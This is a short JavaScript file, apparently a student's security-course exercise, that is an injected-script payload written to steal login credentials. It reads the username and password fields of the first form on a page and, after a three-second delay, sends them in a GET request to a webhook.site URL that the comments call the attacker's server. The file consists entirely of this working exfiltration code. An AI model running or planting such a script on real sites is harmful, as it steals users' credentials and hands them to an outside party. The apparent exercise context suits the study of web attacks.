// Student ID: PA-30967

// capture the value of two elements of first form of the HTML document which are the username and password inputs feilds.
var username = document.forms[0].elements[0].value;
var password = document.forms[0].elements[1].value;
//eof

// set timeout to 3 seconds when the script got trgiggerd
window.setTimeout(function () {
	// request handler
	var request = new XMLHttpRequest();
	//eof

	// make GET request to my server as attacker to https://webhook.site/23a853f5-6b6f-4882-b828-8e65e5edbc10 and pass the value of past varibales to the url as well.
	request.open("GET", "https://webhook.site/23a853f5-6b6f-4882-b828-8e65e5edbc10/username=" +username+ "&passoword=" + password, true);
	// eof

	// send the request now and should be work as https://webhook.site/23a853f5-6b6f-4882-b828-8e65e5edbc10/username=waseem&passoword=waseem as example.
	request.send();
	//eof

}, 3000)
//eof
